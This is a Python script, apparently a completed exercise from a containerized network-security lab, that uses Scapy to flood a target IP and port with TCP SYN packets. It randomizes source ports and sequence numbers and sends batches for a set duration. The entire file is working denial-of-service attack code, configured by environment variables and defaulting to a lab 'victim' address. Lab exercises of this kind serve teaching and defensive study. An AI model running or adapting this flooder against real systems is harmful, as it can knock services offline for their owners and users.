"""
SYN flood attacker — sends TCP SYN packets to a target for a fixed duration.

Configured via environment variables set in docker-compose.yml:
    TARGET_IP      destination IP (default: 172.20.0.10, the victim)
    TARGET_PORT    destination TCP port (default: 80)
    DURATION_SEC   how long to flood, in seconds (default: 30)

Requires NET_ADMIN capability on the container (already set in compose).
"""
import os, time, sys, random

# Scapy's send() is noisy by default; silence it before importing.
os.environ.setdefault("SCAPY_USE_PCAPDNET", "0")
from scapy.all import IP, TCP, send

def parse_env() -> tuple[str, int, int]:
    """Read TARGET_IP, TARGET_PORT, DURATION_SEC from environment.
    Returns a (ip, port, duration) tuple. Fails loudly with sys.exit(1)
    if TARGET_IP is missing — the other two have sensible defaults.
    """
    # Read TARGET_IP from environment, print error and exit if missing.
    target_ip = os.environ.get("TARGET_IP")
    if target_ip is None:
        print("[syn_flood] error: TARGET_IP not set", file=sys.stderr)
        sys.exit(1)
    
    # Convert TARGET_PORT and DURATION_SEC to integers, with defaults. 
    # If these are set but not valid integers, print an error and exit with 1. 
    try:
        target_port = int(os.environ.get("TARGET_PORT", "80"))
        duration_sec = int(os.environ.get("DURATION_SEC", "30"))
    except ValueError as e:
        print(f"Invalid environment variable: {e}", file=sys.stderr)
        sys.exit(1)

    # Return the tuple.
    return target_ip, target_port, duration_sec


def build_syn_packet(target_ip: str, target_port: int):
    """Construct a single TCP SYN packet with a randomized source port
    and sequence number.
    Returns a Scapy packet object. Hint:
        IP(dst=target_ip) / TCP(sport=..., dport=target_port, flags="S", seq=...)
    Use random.randint(1024, 65535) for the source port and
    random.randint(0, 2**32 - 1) for the sequence number.
    """
    # Build and return the packet.
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 2**32 - 1)
    packet = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S",  seq=seq)
    return packet


def flood(target_ip: str, target_port: int, duration_sec: int) -> int:
    """Send SYN packets as fast as possible for `duration_sec` seconds.
    Returns the total number of packets sent. Use a time.time() loop
    rather than a fixed iteration count. Use scapy.send(pkt, verbose=0)
    to avoid per-packet console spam.
    """
    # How many packets to build and send in each batch; adjust as needed
    BATCH_SIZE = 100  
    start_time = time.time()
    count = 0
    while time.time() - start_time < duration_sec:
        batch = [build_syn_packet (target_ip, target_port) for _ in range(BATCH_SIZE)]
        send(batch, verbose=0)
        count += BATCH_SIZE
    return count


def main() -> int:
    """Entry point. Parse env, print a banner, run flood, print summary."""
    target_ip, target_port, duration_sec = parse_env()
    print(f"[syn_flood] target={target_ip}:{target_port} duration={duration_sec}s")
    start = time.time()
    sent = flood(target_ip, target_port, duration_sec)
    elapsed = time.time() - start
    rate = sent / elapsed if elapsed > 0 else 0
    print(f"[syn_flood] sent {sent} packets in {elapsed:.1f}s ({rate:.0f} pps)")
    return 0


if __name__ == "__main__":
    sys.exit(main())